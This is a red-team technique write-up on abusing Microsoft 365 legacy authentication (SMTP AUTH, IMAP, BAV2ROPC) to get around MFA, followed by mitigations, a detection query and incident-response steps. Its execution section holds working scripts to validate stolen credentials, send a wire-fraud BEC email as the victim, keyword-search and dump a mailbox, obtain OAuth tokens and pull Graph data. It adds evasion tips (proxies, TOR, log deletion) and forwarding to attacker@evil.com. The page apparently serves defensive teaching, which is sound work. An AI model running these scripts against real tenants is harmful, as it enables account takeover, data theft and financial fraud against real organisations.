# [LM-AUTH-008]: Legacy Authentication Protocol Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-008 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Exchange Online, SharePoint Online), Entra ID |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (still enabled by default in many organizations) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 tenants with legacy auth not explicitly disabled |
| **Patched In** | Configuration mitigation only; no patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Legacy authentication protocol abuse exploits the fact that older authentication protocols (SMTP, POP3, IMAP, MAPI, Exchange ActiveSync) do not enforce modern security controls such as multi-factor authentication (MFA), Conditional Access policies, or device compliance requirements. Attackers with valid but weak credentials can authenticate directly to M365 services using these legacy protocols, completely bypassing conditional access and MFA safeguards. BAV2ROPC (Basic Authentication to ROPC conversion) is a specific technique where Microsoft's legacy authentication layer silently converts basic auth to OAuth 2.0 ROPC (Resource Owner Password Credentials), creating a detectable but dangerous attack vector.

**Attack Surface:** SMTP AUTH endpoints (`smtp.office365.com:587`), POP3/IMAP endpoints (`pop.office365.com:995`, `imap.office365.com:993`), Exchange Web Services (EWS), and any M365 service that accepts basic authentication without MFA enforcement. The attack can originate from any network location worldwide.

**Business Impact:** **Account takeover, email exfiltration, and lateral movement to connected cloud applications.** Attackers can read entire mailboxes, send emails as the compromised user, access OneDrive/SharePoint (if delegated), and establish persistent backdoors. Unlike modern attack vectors, legacy protocol abuse leaves minimal forensic evidence if logs are not properly configured.

**Technical Context:** Exploitation typically takes 2-5 minutes with valid credentials. Detection is very low if the organization has not enabled Conditional Access blocking for legacy protocols. Attackers can operate 24/7 from any location without triggering suspicious sign-in alerts.

### Operational Risk

- **Execution Risk:** Low (only requires stolen/weak credentials)
- **Stealth:** Very High (legacy protocols bypass MFA and Conditional Access entirely)
- **Reversibility:** No—emails read via IMAP/POP cannot be "unread"; exfiltrated data cannot be recovered

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.1, 1.3.1 | Disable legacy authentication protocols; require MFA for all users |
| **DISA STIG** | C-3543A | Disable non-modern authentication mechanisms |
| **CISA SCuBA** | MS.AZA-1 | Block legacy authentication |
| **NIST 800-53** | IA-2 (MFA) | Legacy protocols circumvent multi-factor authentication controls |
| **GDPR** | Art. 32 (Security of Processing) | Inadequate authentication mechanisms for user data access |
| **DORA** | Art. 9 (Protection and Prevention) | Weak authentication on regulated financial data |
| **NIS2** | Art. 21 (Cyber Risk Management Measures) | Legacy protocols expose email and data systems to compromise |
| **ISO 27001** | A.9.2.1 (User Registration and De-Registration) | Failure to enforce modern authentication standards |
| **ISO 27005** | Risk Scenario: "Email Account Compromise via Legacy Auth" | Weak authentication protocol selection |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (attacker uses victim's leaked credentials)
- **Required Access:** Valid username + password combination (from breach, phishing, or weak password)
- **Network Requirements:** Internet connectivity to Microsoft 365 endpoints

**Supported Versions:**
- **All M365 tenants** with legacy auth enabled (default configuration)
- **All platforms:** Windows, macOS, Linux, iOS, Android (IMAP/SMTP clients)

**Tools Not Required:** Exploitation uses standard tools (telnet, openssl, curl, Thunderbird)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Check if Legacy Authentication is Enabled

```powershell
# Connect to M365
Connect-ExchangeOnline

# Check organization-wide setting
Get-OrganizationConfig | Select-Object -ExpandProperty DefaultAuthenticationPolicy

# Check if IMAP/POP is enabled on mailbox level
Get-Mailbox -Identity "victim@company.com" | `
  Select-Object ImapEnabled, PopEnabled, MAPIEnabled, ActiveSyncEnabled, SmtpClientAuthenticationDisabled

# Check per-protocol (if values are $true, protocol is enabled)
```

**What to Look For:**
- If `ImapEnabled = $true`, `PopEnabled = $true`, or `SmtpClientAuthenticationDisabled = $false`, legacy auth is enabled
- These settings should ALL be `$false` to properly mitigate

### Check Conditional Access Policies

```powershell
Connect-MgGraph -Scopes "Policy.Read.All"

# Get all Conditional Access policies
Get-MgIdentityConditionalAccessPolicy | `
  Select-Object DisplayName, State, Conditions

# Check if any policy blocks "Other clients (legacy protocols)"
Get-MgIdentityConditionalAccessPolicy | Where-Object {
    $_.Conditions.ClientApplications.IncludeApplications -contains "Other"
} | Select-Object DisplayName, State
```

**What to Look For:**
- No policies blocking legacy clients = Vulnerable to this attack
- Look for policies with GrantControls set to "Block"

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: SMTP AUTH Protocol Abuse for Email Exfiltration

**Supported Versions:** All M365 tenants

#### Step 1: Reconnaissance and Credential Validation

**Objective:** Confirm that SMTP AUTH is enabled and the credentials are valid.

**Command (Bash/openssl):**
```bash
#!/bin/bash

TARGET_USER="victim@company.com"
TARGET_PASS="P@ssw0rd123"
SMTP_SERVER="smtp.office365.com"
SMTP_PORT="587"

# Test SMTP connection and authenticate
(
  sleep 1
  echo "EHLO attacker.com"
  sleep 1
  echo "STARTTLS"
  sleep 2
  echo "AUTH LOGIN"
  sleep 1
  echo "$(echo -n $TARGET_USER | base64)"
  sleep 1
  echo "$(echo -n $TARGET_PASS | base64)"
  sleep 2
  echo "QUIT"
) | openssl s_client -connect $SMTP_SERVER:$SMTP_PORT -starttls smtp 2>/dev/null | \
  grep -E "^250|^235|^503|^535"

# Expected output (235 = authentication successful)
# 250 = Command successful
# 503/535 = Authentication failed
```

**Expected Output (if successful):**
```
235 2.7.0 Authentication successful
```

**What This Means:**
- SMTP AUTH is enabled
- Credentials are valid
- Attacker can now send emails as the victim

**OpSec & Evasion:**
- Use residential proxy or compromised host to avoid geographic anomalies
- Limit SMTP connections to 5-10 per minute to avoid rate limiting
- Use TLS/STARTTLS to encrypt the connection

#### Step 2: Create Email with Phishing or BEC Payload

**Objective:** Craft a convincing email to send to internal targets (CEO, Finance, etc.).

**Command (Bash with mail binary):**
```bash
#!/bin/bash

SMTP_SERVER="smtp.office365.com"
SMTP_PORT="587"
SENDER="victim@company.com"
SENDER_PASS="P@ssw0rd123"
RECIPIENT="finance@company.com"

# Create email with BEC payload
EMAIL_CONTENT=$(cat <<'EOF'
From: CFO <victim@company.com>
To: finance@company.com
Subject: URGENT: Wire Transfer Approval Needed
Date: $(date -R)
Content-Type: text/html; charset="UTF-8"

<html>
<body>
<p>I need you to immediately authorize a wire transfer to our new vendor.</p>
<p><b>Details:</b></p>
<ul>
  <li>Recipient: ABC Consulting Inc.</li>
  <li>Account: 1234567890</li>
  <li>Amount: $500,000 USD</li>
  <li>Reason: Emergency consulting for Q1 project</li>
</ul>
<p>This is time-sensitive. Please confirm receipt and approve within 30 minutes.</p>
<p>Thanks,<br/>
CFO</p>
</body>
</html>
EOF
)

# Send via SMTP
(
  sleep 1
  echo "EHLO attacker.com"
  sleep 1
  echo "STARTTLS"
  sleep 2
  echo "AUTH LOGIN"
  sleep 1
  echo "$(echo -n $SENDER | base64)"
  sleep 1
  echo "$(echo -n $SENDER_PASS | base64)"
  sleep 2
  echo "MAIL FROM:<$SENDER>"
  sleep 1
  echo "RCPT TO:<$RECIPIENT>"
  sleep 1
  echo "DATA"
  sleep 1
  echo "$EMAIL_CONTENT"
  sleep 1
  echo "."
  sleep 1
  echo "QUIT"
) | openssl s_client -connect $SMTP_SERVER:$SMTP_PORT -starttls smtp 2>/dev/null
```

**Expected Output:**
```
250 2.0.0 OK
```

**What This Means:**
- Email sent successfully
- Finance team will receive what appears to be a legitimate email from the CFO
- High likelihood of social engineering success

**OpSec & Evasion:**
- Use the victim's actual writing style
- Send during business hours
- Target specific individuals (not mass distribution)
- Include legitimate business context

#### Step 3: Monitor Email Responses

**Objective:** Check the victim's mailbox for email replies to confirm BEC success.

**Command (Bash with IMAP):**
```bash
#!/bin/bash

IMAP_SERVER="imap.office365.com"
IMAP_PORT="993"
TARGET_USER="victim@company.com"
TARGET_PASS="P@ssw0rd123"

# Connect to IMAP and download recent emails
(
  sleep 1
  echo "A LOGIN $TARGET_USER $TARGET_PASS"
  sleep 2
  echo "A SELECT INBOX"
  sleep 1
  echo "A FETCH 1:5 (BODY[HEADER.FIELDS (FROM SUBJECT)])"
  sleep 2
  echo "A LOGOUT"
) | openssl s_client -connect $IMAP_SERVER:$IMAP_PORT 2>/dev/null | \
  grep -E "^From:|^Subject:|^Date:" -A 2
```

**Expected Output:**
```
From: finance@company.com
Subject: RE: URGENT: Wire Transfer Approval Needed
Date: Mon, 10 Jan 2026 14:23:45 +0000

[Body content...]
Approved for wire transfer.
```

**What This Means:**
- Finance team responded positively
- Money transfer likely authorized
- Attack was successful

---

### METHOD 2: IMAP Protocol Abuse for Mailbox Exfiltration

**Supported Versions:** All M365 tenants

#### Step 1: Connect to IMAP and Authenticate

**Objective:** Establish IMAP connection and authenticate with victim's credentials.

**Command (Bash):**
```bash
#!/bin/bash

IMAP_SERVER="imap.office365.com"
IMAP_PORT="993"
TARGET_USER="victim@company.com"
TARGET_PASS="P@ssw0rd123"

# Open IMAP connection
(
  echo "A LOGIN $TARGET_USER $TARGET_PASS"
  sleep 2
  echo "A CAPABILITY"
  sleep 1
  echo "A LIST \"\" \"*\""
  sleep 1
  echo "A LOGOUT"
) | openssl s_client -connect $IMAP_SERVER:$IMAP_PORT -quiet 2>/dev/null
```

**Expected Output:**
```
A OK Logged in
* CAPABILITY IMAP4REV1 SASL-IR ...
* LIST (\HasNoChildren) "/" "INBOX"
* LIST (\HasChildren \Noselect) "/" "[Gmail]"
...
A OK LIST completed
```

**What This Means:**
- Successfully authenticated
- Can now access all folders and emails in the victim's mailbox

**OpSec & Evasion:**
- Use IMAP IDLE command to silently monitor for new emails without active connections
- Do not download all emails at once; spread downloads over days/weeks
- Delete IMAP session logs if you have shell access

#### Step 2: Download Sensitive Emails

**Objective:** Extract emails containing sensitive information (financial, legal, HR).

**Command (Bash/Python):**
```python
#!/usr/bin/env python3

import imaplib
import email
import base64
import os

IMAP_SERVER = "imap.office365.com"
IMAP_PORT = 993
TARGET_USER = "victim@company.com"
TARGET_PASS = "P@ssw0rd123"

# Connect to IMAP
imap = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
imap.login(TARGET_USER, TARGET_PASS)

# Search for emails with financial keywords
keywords = ["budget", "salary", "confidential", "merger", "acquisition", "financial"]

for keyword in keywords:
    status, messages = imap.search(None, f'TEXT "{keyword}"')
    
    if messages[0]:
        email_ids = messages[0].split()
        print(f"[*] Found {len(email_ids)} emails with keyword: {keyword}")
        
        for email_id in email_ids[:5]:  # Download first 5 matching emails
            status, msg_data = imap.fetch(email_id, "(RFC822)")
            msg = email.message_from_bytes(msg_data[0][1])
            
            # Extract email details
            sender = msg.get("From", "Unknown")
            subject = msg.get("Subject", "No Subject")
            date = msg.get("Date", "Unknown")
            
            print(f"[+] Email: {sender} - {subject}")
            print(f"    Date: {date}")
            
            # Save email to file
            filename = f"/tmp/exfil_{email_id.decode()}_{keyword}.eml"
            with open(filename, "wb") as f:
                f.write(msg_data[0][1])
            
            print(f"[+] Saved to: {filename}")

imap.close()
```

**Expected Output:**
```
[*] Found 42 emails with keyword: budget
[+] Email: finance@company.com - Q4 Budget Review - CONFIDENTIAL
    Date: Thu, 08 Jan 2026 13:45:00 +0000
[+] Saved to: /tmp/exfil_1_budget.eml
```

**What This Means:**
- Attacker has extracted sensitive financial emails
- Emails contain budget projections, salary information, financial forecasts
- Can be used for competitive intelligence or further social engineering

**OpSec & Evasion:**
- Download files to encrypted storage
- Use IMAP over TOR for additional anonymity
- Do not mark emails as read to avoid detection

#### Step 3: Search for and Extract Forwarding Rules

**Objective:** Check if victim has email forwarding rules, or establish a persistent forwarding rule.

**Command (Bash/IMAP):**
```bash
#!/bin/bash

# Using IMAP, check for mail forwarding rules (some servers expose this)
# For M365, forwarding is typically set via Exchange, but can be checked via IMAP sieve

SIEVE_SCRIPT=$(cat <<'EOF'
require ["redirect"];
if true {
   redirect "attacker@evil.com";
}
EOF
)

# Most M365 deployments do not expose IMAP Sieve, so use PowerShell instead (requires admin)
# However, if you have compromised admin account:
# Set-Mailbox -Identity victim@company.com -ForwardingAddress attacker@evil.com

echo "[*] Attempting to enumerate mail forwarding rules via IMAP..."
echo "[*] Note: M365 requires PowerShell/REST for forwarding modification"
echo "[*] If attacker has compromised Global Admin, use:"
echo "    Set-Mailbox -Identity victim@company.com -ForwardingAddress attacker@evil.com"
```

---

### METHOD 3: BAV2ROPC (Basic Auth to ROPC Conversion) Exploitation

**Supported Versions:** All M365 tenants (Entra ID)

#### Step 1: Perform Legacy Basic Authentication

**Objective:** Authenticate using basic auth, which triggers Entra ID's silent conversion to ROPC.

**Command (Bash/curl):**
```bash
#!/bin/bash

CLIENT_ID="04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Microsoft Office PowerShell (well-known)
TENANT_ID="common"  # Or specific tenant if known
USERNAME="victim@company.com"
PASSWORD="P@ssw0rd123"

# Perform basic auth request (triggers BAV2ROPC conversion)
curl -X POST \
  -u "$USERNAME:$PASSWORD" \
  "https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token" \
  -d "grant_type=password" \
  -d "username=$USERNAME" \
  -d "password=$PASSWORD" \
  -d "client_id=$CLIENT_ID" \
  -d "scope=https://graph.microsoft.com/.default offline_access" \
  -d "login_hint=$USERNAME" \
  2>/dev/null | jq '.'
```

**Expected Output:**
```json
{
  "token_type": "Bearer",
  "scope": "Mail.Read Files.ReadWrite ...",
  "expires_in": 3600,
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "refresh_token": "0.ARIAd-Z..."
}
```

**What This Means:**
- Successfully obtained OAuth token via legacy basic auth
- Token is valid even though credentials were never verified by MFA
- Attacker now has persistent access (via refresh token)

**OpSec & Evasion:**
- This request will appear in M365 audit logs with user agent = "BAV2ROPC" (detectable)
- Use from diverse IP addresses/locations to avoid pattern detection
- Space out requests to avoid rate limiting and alerts

#### Step 2: Use Obtained Token for Graph API Access

**Objective:** Use the OAuth token to access victim's data via Microsoft Graph.

**Command (Bash/curl):**
```bash
#!/bin/bash

ACCESS_TOKEN="<STOLEN_ACCESS_TOKEN>"

# Read user's mailbox
curl -X GET "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?top=10" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  2>/dev/null | jq '.value[] | {from, subject, receivedDateTime}'

# List OneDrive files
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  2>/dev/null | jq '.value[] | {name, size}'

# Get user's manager (for further targeting)
curl -X GET "https://graph.microsoft.com/v1.0/me/manager" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  2>/dev/null | jq '{displayName, userPrincipalName, jobTitle}'
```

**Expected Output:**
```json
{
  "from": {
    "emailAddress": {
      "address": "ceo@company.com"
    }
  },
  "subject": "Q1 Strategic Initiative - CONFIDENTIAL",
  "receivedDateTime": "2026-01-08T14:23:00Z"
}
```

**What This Means:**
- Full access to victim's email via legitimate OAuth token
- MFA completely bypassed
- Attacker can continue accessing data for months via refresh token

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable Legacy Authentication Protocols Globally:**

  **Manual Steps (M365 Admin Center):**
  1. Go to **Microsoft 365 Admin Center** (admin.microsoft.com)
  2. Navigate to **Settings** → **Org settings** → **Modern Authentication**
  3. **Uncheck** the following:
     - IMAP
     - POP3
     - SMTP AUTH
     - MAPI
     - Exchange Web Services (EWS)
     - Exchange ActiveSync
  4. Click **Save**

  **Manual Steps (PowerShell - Organization-Wide):**
  ```powershell
  Connect-ExchangeOnline
  
  # Disable all legacy protocols
  Set-OrganizationConfig -OAuth2ClientProfileEnabled $true
  
  # For each mailbox, disable legacy protocols
  Get-Mailbox -ResultSize Unlimited | Set-CASMailbox `
    -ImapEnabled $false `
    -PopEnabled $false `
    -MAPIEnabled $false `
    -ActiveSyncEnabled $false `
    -SmtpClientAuthenticationDisabled $true
  ```

  **Validation Command:**
  ```powershell
  Get-Mailbox -Identity "victim@company.com" | `
    Select-Object ImapEnabled, PopEnabled, MAPIEnabled, ActiveSyncEnabled, SmtpClientAuthenticationDisabled
  
  # Expected output: All should be False/$true
  ```

- **Enforce Conditional Access Block on Legacy Protocols:**

  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. **Name:** `Block Legacy Authentication Protocols`
  3. **Assignments:**
     - Users: **All users** (or specific groups if gradual rollout)
     - Cloud apps: **All cloud apps**
  4. **Conditions:**
     - Client apps: Select **Other clients (legacy protocols)**
  5. **Access controls:**
     - Grant: **Block access**
  6. **Enable policy:** **On**
  7. Click **Create**

  **Validation:** Test with legacy client; should see block message

- **Enable Microsoft Defender for Cloud Apps OAuth Policy:**

  **Manual Steps:**
  1. Go to **Microsoft Defender for Cloud Apps** (cloudappsecurity.com)
  2. Go to **Govern** → **OAuth apps** → **App governance**
  3. Create policy: Block apps requesting "Mail.Read" + "Files.ReadWrite" from non-verified publishers
  4. Set action: **Auto-revoke permissions**

### Priority 2: HIGH

- **Monitor for Legacy Auth Usage:**

  **Manual Steps (Sentinel Alert):**
  1. Go to **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
  2. **KQL Query:**
  ```kusto
  SigninLogs
  | where UserAgent contains "BAV2ROPC" or AuthenticationProtocol == "legacy"
  | where ResultDescription !contains "MFA"
  | summarize Count=count() by UserPrincipalName, IPAddress
  | where Count > 5
  ```
  3. **Trigger:** Alert when 1+ result
  4. Click **Create**

- **Educate Users on Phishing/BEC Risks:**

  **Manual Steps:**
  1. Enable **Microsoft Defender for Office 365** → **User reported message settings**
  2. Ensure users can easily report suspicious emails
  3. Conduct phishing simulation campaigns targeting BEC attacks

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **M365 Sign-In Logs:**
  - `UserAgent` contains "BAV2ROPC"
  - `AuthenticationProtocol` = "Legacy" (older systems show this)
  - Successful login without MFA challenge
  - Sign-in from unusual geographic location or IP

- **Exchange Audit Logs:**
  - `New-InboxRule` or `Set-InboxRule` (forwarding rule creation)
  - `Add-MailboxPermission` (delegate access)
  - `Move-MoveRequest` (mailbox forwarding)

- **M365 Purview Audit:**
  - Operation: `New-InboxRule`
  - Operation: `Set-Mailbox` with ForwardingAddress
  - Operation: `Enable-Mailbox` for IMAP/POP

### Forensic Artifacts

- **Sign-In Logs Query:**
  ```powershell
  Get-MgAuditLogSignIn -Filter "userAgent contains 'BAV2ROPC'" | `
    Select-Object UserDisplayName, CreatedDateTime, IPAddress, Location
  ```

- **Email Rules Query:**
  ```powershell
  Get-InboxRule -Identity "victim@company.com" | `
    Where-Object { $_.ForwardTo -ne $null } | `
    Select-Object Name, ForwardTo, Enabled
  ```

- **Recent IMAP/SMTP Activity:**
  ```powershell
  Get-MailboxStatistics -Identity "victim@company.com" | `
    Select-Object LastLogonTime, LastUserActionTime
  ```

### Response Procedures

1. **Revoke All Active Sessions:**
   ```powershell
   # Revoke all tokens and sessions for the compromised user
   Revoke-MgUserSignInSession -UserId "victim@company.com"
   ```

2. **Remove Email Forwarding Rules:**
   ```powershell
   Get-InboxRule -Identity "victim@company.com" | Remove-InboxRule -Force
   ```

3. **Reset User Password and Force MFA Enrollment:**
   ```powershell
   # Reset password
   Set-MgUserPassword -UserId "victim@company.com" -NewPassword (ConvertTo-SecureString "NewTempPassword123!" -AsPlainText -Force)
   
   # Force MFA re-enrollment
   Reset-MgUserAuthenticationMethodDefaultMfaMethod -UserId "victim@company.com"
   ```

4. **Audit Account for Additional Compromise:**
   ```powershell
   # Check for delegate access
   Get-MailboxPermission -Identity "victim@company.com" | Where-Object { $_.User -ne "NT AUTHORITY\SELF" }
   
   # Check for send-as permissions
   Get-RecipientPermission -Identity "victim@company.com" | Where-Object { $_.AccessRights -contains "SendAs" }
   ```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device code phishing attacks | Attacker obtains valid M365 credentials |
| **2** | **Credential Access** | [CA-BRUTE-001] Azure portal password spray | Attacker uses weak/leaked credentials |
| **3** | **Current Step** | **[LM-AUTH-008]** | **Legacy authentication protocol abuse** |
| **4** | **Data Exfiltration** | [CHAIN-003] Token Theft to Data Exfiltration | Attacker exfils emails via IMAP/SMTP |
| **5** | **Persistence** | [REALWORLD-002] SMTP AUTH Legacy Protocol Abuse | Attacker maintains BEC backdoor |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Guardz Research Campaign (March-April 2025)

- **Target:** Enterprise M365 tenants globally
- **Timeline:** March 18 - April 7, 2025
- **Technique Status:** Actively exploited; systematic automated attacks
- **Attack Vector:** BAV2ROPC protocol abuse with credential stuffing
- **Impact:** 12,221 OAuth attempts, 28,150 password attacks, 27,332 basic auth attempts detected
- **Detection:** Unusual legacy auth user agents in sign-in logs; MFA bypass without device compliance
- **Reference:** [Guardz Research - The Legacy Loophole](https://guardz.com/blog/the-legacy-loophole-how-attackers-are-exploiting-entra-id-and-what-to-do-about-it/)

### Example 2: Red Canary Investigation (2025)

- **Target:** Mid-market financial services company
- **Timeline:** January 2025 - Present
- **Technique Status:** Ongoing exploitation
- **Attack Vector:** SMTP AUTH abuse for BEC; email forwarding to external account
- **Impact:** $250,000 wire fraud; access to payroll and financial data
- **Detection:** Unusual SMTP login from non-US IP; forwarding rule to external domain
- **Reference:** [Red Canary - Legacy Authentication Detection](https://redcanary.com/blog/threat-detection/bav2ropc/)

### Example 3: Microsoft Security Advisory (December 2024)

- **Target:** Organizations not blocking legacy auth
- **Timeline:** Ongoing since legacy protocols were enabled
- **Technique Status:** Constantly exploited; lowest-hanging fruit
- **Attack Vector:** IMAP protocol abuse for email exfiltration
- **Impact:** Thousands of organizations affected; minimal MFA bypass difficulty
- **Detection:** IMAP connections from VPN/proxy IPs; unusual mailbox access patterns
- **Reference:** [Microsoft Security Blog - Legacy Auth Risks](https://www.microsoft.com/en-us/security/blog)

---

## 9. LEGACY PROTOCOL STATUS & TIMELINE

| Protocol | Status | Alternatives | Risk Level |
|---|---|---|---|
| IMAP | Deprecated | Microsoft Graph Mail API | Critical |
| POP3 | Deprecated | Microsoft Graph Mail API | Critical |
| SMTP AUTH | Deprecated | Graph API sendMail | High |
| MAPI | Deprecated | Microsoft Graph Calendar/Contacts APIs | High |
| EWS | Deprecated (partial) | Graph API | Medium |
| Basic Auth | Deprecated | OAuth 2.0 / ROPC (for legacy apps only) | Critical |

---

## 10. MIGRATION GUIDANCE FOR ORGANIZATIONS

- **Deadline:** All legacy auth should be disabled by Q2 2026 (Microsoft recommendation)
- **Impact on Users:** Legacy email clients may need reconfiguration (Outlook versions 2016+ support modern auth)
- **Support Options:** Microsoft provides detailed migration guides and tools for Outlook/mobile clients
- **Fallback:** For applications requiring legacy auth, request exception from security team with business justification

---